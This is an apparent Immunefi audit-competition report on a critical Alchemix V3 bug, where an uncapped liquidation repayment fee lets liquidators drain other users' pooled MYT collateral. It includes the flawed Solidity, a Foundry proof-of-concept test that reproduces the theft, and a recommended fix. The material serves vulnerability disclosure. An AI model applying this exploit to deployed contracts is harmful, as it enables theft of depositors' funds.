# 58772 sc critical resolverepaymentfee overpays liquidators when collateral is gone letting attackers drain myt

**Submitted on Nov 4th 2025 at 12:47:31 UTC by @niffylord for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58772
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief / Intro

During liquidation of earmarked debt, the helper `_resolveRepaymentFee` computes the liquidator fee as `repaidAmountInYield * repaymentFee / BPS` and subtracts **at most** the borrower’s remaining collateral. However, it still returns the original fee value even when the borrower had insufficient collateral to cover it. `_liquidate` trusts that return value and transfers the full fee from the Alchemist contract to the liquidator, effectively stealing the shortfall from the protocol’s global MYT balance (i.e., other users’ collateral). After a share-price loss — the exact scenario earmarked liquidations have to handle — an attacker can repeatedly force repayments on underwater positions and siphon arbitrary amounts of MYT from the system.

***

## Vulnerability Details

Key code (simplified):

```solidity
function _resolveRepaymentFee(uint256 accountId, uint256 repaidAmountInYield) internal returns (uint256 fee) {
    fee = repaidAmountInYield * repaymentFee / BPS;
    account.collateralBalance -= fee > account.collateralBalance ? account.collateralBalance : fee;
    return fee;
}

// In _liquidate(...)
feeInYield = _resolveRepaymentFee(accountId, repaidAmountInYield);
TokenUtils.safeTransfer(myt, msg.sender, feeInYield);
```

* The subtraction caps the collateral deduction (`min(fee, account.collateralBalance)`), but nothing updates `fee` to reflect that cap.
* When the borrower has little or no collateral left (common after MYT loses value and `_forceRepay` has to consume the entire balance), `_resolveRepaymentFee` still returns the *uncapped* fee.
* `_liquidate` then transfers `feeInYield` from the Alchemist contract’s MYT holdings directly to the liquidator. The shortfall is paid out of global collateral, effectively stealing from other users.
* No accounting variable (`_mytSharesDeposited`) is adjusted for the extra payout, so the theft remains hidden while draining solvency.

Because repay-on-liquidation fires whenever a position’s earmarked debt is cleared, an attacker can hunt for underwater accounts (e.g., after any strategy loss), trigger `_forceRepay` and immediately pocket `repaymentFee` worth of MYT taken from the protocol, regardless of how much collateral the victim still had.

***

## Impact

* **Direct theft:** A malicious liquidator can repeatedly target underwater accounts (very common after strategy losses) and extract `repaymentFee` worth of MYT from the protocol, regardless of how much collateral the victim still had. The shortfall comes straight out of the Alchemist contract’s global balance — i.e., other users’ deposits.
* **Scalability:** The attacker can siphon up to the entire global MYT float by looping across positions or even by re-triggering on the same account whenever share price dips.
* **Stealth & insolvency:** Because `_mytSharesDeposited` isn’t reduced when the overpaid fee is sent, TVL metrics remain inflated and the insolvency remains hidden until redemptions fail.

This is a protocol-killing condition: any significant MYT drawdown lets liquidators drain the remaining collateral, bankrupting the system and stranding all redemptions.

***

## References

* `_resolveRepaymentFee`: <https://github.com/alchemix-finance/v3-poc/blob/immunefi_audit/src/AlchemistV3.sol#L894-L909>
* `_liquidate` repayment-fee branch: <https://github.com/alchemix-finance/v3-poc/blob/immunefi_audit/src/AlchemistV3.sol#L816-L845>
* `_forceRepay` collateral clamp preceding fee payout: <https://github.com/alchemix-finance/v3-poc/blob/immunefi_audit/src/AlchemistV3.sol#L744-L778>
* Proof-of-concept test: `src/test/poc/RepaymentFeeTheft.t.sol`

***

## Proof of Concept

Foundry test demonstrating the theft (uses the existing `AlchemistV3Test` harness):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {AlchemistV3Test} from "../AlchemistV3.t.sol";
import {AlchemistNFTHelper} from "../libraries/AlchemistNFTHelper.sol";
import {IMockYieldToken} from "../mocks/MockYieldToken.sol";
import {IERC20} from "../../../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

contract RepaymentFeeTheftPoC is AlchemistV3Test {
    function test_poc_repayment_fee_drains_global_collateral() external {
        vm.startPrank(alOwner);
        alchemist.setProtocolFee(0);
        alchemist.setRepaymentFee(10_000); // 100% repayment fee
        transmuterLogic.setTransmutationTime(1);
        vm.stopPrank();

        // Donor deposits extra MYT so the contract has shares that can be stolen.
        vm.startPrank(anotherExternalUser);
        IERC20(address(vault)).approve(address(alchemist), type(uint256).max);
        alchemist.deposit(1_000e18, anotherExternalUser, 0);
        vm.stopPrank();

        // Victim mints debt and stakes it in the transmuter, earmarking the entire position.
        vm.startPrank(externalUser);
        IERC20(address(vault)).approve(address(alchemist), type(uint256).max);
        alchemist.deposit(100e18, externalUser, 0);
        uint256 victimTokenId = AlchemistNFTHelper.getFirstTokenId(externalUser, address(alchemistNFT));
        uint256 maxBorrow = alchemist.getMaxBorrowable(victimTokenId);
        alchemist.mint(victimTokenId, maxBorrow, externalUser);
        IERC20(address(alToken)).approve(address(transmuterLogic), maxBorrow);
        transmuterLogic.createRedemption(maxBorrow);
        vm.stopPrank();

        vm.roll(block.number + 2); // Redemption matures

        // Slash MYT share price so forced repayment needs more shares than the victim still has.
        uint256 strategyBalance = IERC20(mockVaultCollateral).balanceOf(mockStrategyYieldToken);
        vm.startPrank(alOwner);
        IMockYieldToken(mockStrategyYieldToken).siphon(strategyBalance - 1e9); // leave dust
        vault.accrueInterest();
        vm.stopPrank();

        uint256 sharesBefore = IERC20(address(vault)).balanceOf(address(alchemist));
        uint256 liquidatorBefore = IERC20(address(vault)).balanceOf(yetAnotherExternalUser);

        // Liquidator collects the entire repayment fee even though the victim had zero collateral left.
        vm.startPrank(yetAnotherExternalUser);
        (uint256 repaidYield, uint256 feeYield,) = alchemist.liquidate(victimTokenId);
        vm.stopPrank();

        uint256 sharesAfter = IERC20(address(vault)).balanceOf(address(alchemist));
        uint256 liquidatorAfter = IERC20(address(vault)).balanceOf(yetAnotherExternalUser);

        assertEq(feeYield, repaidYield, "100% fee equals repaid amount");
        assertEq(liquidatorAfter - liquidatorBefore, feeYield, "liquidator pocketed the fee");

        uint256 totalLoss = sharesBefore - sharesAfter;
        assertEq(totalLoss, repaidYield + feeYield, "contract lost principal + stolen fee");
        assertGt(totalLoss, repaidYield, "extra loss equals the stolen collateral");
    }
}
```

Run with:

```bash
forge test --match-test test_poc_repayment_fee_drains_global_collateral -vv
```

The test shows the protocol loses `repaidYield + feeYield` MYT shares even though the victim only had `repaidYield`, with the extra `feeYield` ending up in the liquidator’s wallet.

***

## Recommended Fix

1. Cap the returned fee to the actual amount removed from the borrower:

   ```solidity
   uint256 payableFee = fee > account.collateralBalance ? account.collateralBalance : fee;
   account.collateralBalance -= payableFee;
   return payableFee;
   ```
2. Decrement `_mytSharesDeposited` by the fee that is actually transferred, so global accounting matches reality.
3. Consider reverting if `payableFee == 0` to prevent liquidators from free-rolling repayment-fee calls when there is no collateral left.

By ensuring the fee paid matches the collateral actually forfeited, liquidators can no longer mint value out of the protocol’s pooled collateral.
